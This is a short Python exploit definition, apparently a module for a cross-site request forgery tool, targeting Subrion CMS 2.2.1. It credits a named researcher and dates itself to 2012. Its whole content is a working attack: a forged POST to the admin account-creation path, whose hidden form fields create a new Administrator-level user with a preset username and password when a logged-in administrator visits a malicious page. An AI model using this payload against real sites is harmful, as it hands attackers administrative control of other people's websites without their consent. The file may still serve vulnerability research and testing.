# -*- coding: utf-8 -*-

NAME = "Subrion CMS 2.2.1 CSRF Add Admin Exploit"
DESCRIPTION = '''The application allows users to perform certain actions via HTTP requests without performing any validity checks to verify the requests. This can be exploited to perform certain actions with administrative privileges if a logged-in user visits a malicious web site.'''
AUTHOR = "Gjoko 'LiquidWorm' Krstic"
AUTHOR_URL = "http://www.zeroscience.mk/"
DATE = "2012-09-12"

METHOD = "POST"
PATH = "/admin/accounts/add/"

PARAMS = [
    {
        "type": "hidden",
        "name": "username",
        "value": "Commando",
        "custom": True,
        "description": "Username of the new user"
    },
    {
        "type": "hidden",
        "name": "fullname",
        "value": "Arnold Schwarzenegger",
        "custom": True,
        "description": "Fullname of the new user"
    },
    {
        "type": "hidden",
        "name": "email",
        "value": "lab@zeroscience.mk",
        "custom": True,
        "description": "Email of the new user"
    },
    {
        "type": "hidden",
        "name": "_password",
        "value": "l33tP4ss!",
        "custom": True,
        "description": "Password of the new user"
    },
    {
        "type": "hidden",
        "name": "_password2",
        "value": "l33tP4ss!",
        "custom": True,
        "description": "Password of the new user"
    },
    {
        "type": "hidden",
        "name": "usergroup",
        "value": "1",
        "custom": True,
        "description": "1:Administrator / 2:Moderator / 8:Registered"
    },
    {
        "type": "hidden",
        "name": "avatar",
        "value": "",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "sponsored",
        "value": "0",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "plan_id",
        "value": "1",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "sponsored_end",
        "value": "",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "status",
        "value": "active",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "save",
        "value": "Add",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "goto",
        "value": "list",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "old_name",
        "value": "ZSL",
        "custom": False
    }
]